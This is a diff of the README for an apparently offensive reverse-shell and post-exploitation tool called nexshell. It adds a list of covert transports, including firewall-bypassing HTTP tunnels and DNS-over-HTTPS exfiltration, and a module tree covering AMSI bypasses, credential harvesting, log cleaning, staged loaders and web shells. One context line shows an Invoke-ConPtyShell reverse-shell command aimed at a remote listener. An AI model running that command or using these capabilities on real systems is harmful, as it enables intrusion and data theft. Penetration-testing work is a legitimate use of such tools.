@@ -109,6 +109,11 @@
 | Terminal size synchronization | ✅ (SIGWINCH) | ✅ (Polling) | ✅ |
 | Re-connection & Keepalives | ✅ | ✅ | ✅ |
 
+### 🔒 Secure & Covert Transports
+- **TLS/mTLS Listeners**: Native stdlib-only TLS 1.2/1.3 encrypted listener sockets with on-the-fly certificate generation.
+- **HTTP/HTTPS Tunneling**: Clean, stateful HTTP GET/POST agent tunneling to bypass strict boundary firewalls.
+- **DNS-over-HTTPS (DoH)**: Exfiltrate data covertly by routing DNS chunks through trusted providers (Cloudflare, Google, OpenDNS).
+
 ### 📂 Dynamic Payload Library
 Stored as template files under `payloads/` and dynamically rendered with target configurations:
 - **Linux (15 templates)**: bash, bash_196, mkfifo, nc_e, busybox_nc, socat, awk, python3, python2, perl, ruby, php, lua, golang, curl_sh.
@@ -291,15 +296,24 @@ Invoke-ConPtyShell -RemoteIp 10.10.14.1 -RemotePort 4444 -Rows 50 -Cols 220
 
 ```
 nexshell/
-├── nexshell.py          # Main engine (standalone, no deps)
+├── nexshell.py             # Main commander engine (standalone, no deps)
 ├── modules/
 │   ├── __init__.py
-│   ├── windows.py       # Windows payloads, AMSI bypass, PrivEsc, CredHarvest
-│   └── ops.py           # Persistence, Lateral, AD Recon, Container Escape, Exfil
+│   ├── loot.py             # Loot parser, log scanner, HTML/Markdown/JSON exporter
+│   ├── ops.py              # Recon, persistence, lateral, container escape, exfiltration
+│   ├── opsec.py            # OPSEC profiles (ghost/normal/paranoid), timestomp, logclean, obfuscation
+│   ├── session_manager.py  # Snapshots, health monitoring, SIGWINCH/polling term sync, PTY upgrade advisor
+│   ├── transport.py        # TLS/mTLS listeners, HTTP/HTTPS tunnels, DoH exfil covert channel
+│   ├── ui.py               # Auto-completer, typo corrector, aliases, inline hints, timer
+│   └── windows.py          # Windows payloads, AMSI bypasses, PrivEsc checks, credential harvest
 ├── payloads/
-│   └── __init__.py
-├── setup.sh             # Cross-platform installer
-└── README.md
+│   ├── __init__.py
+│   ├── linux/              # Linux reverse shell templates (bash, awk, busybox, etc.)
+│   ├── staged/             # Staged loaders (stager_linux, stager_windows)
+│   ├── web/                # Web shells (php, asp, aspx, jsp)
+│   └── windows/            # Windows reverse shell templates (powershell, conptyshell, lolbins)
+├── setup.sh                # Cross-platform installer (Linux/macOS)
+└── README.md               # Documentation
 ```
 
 ---
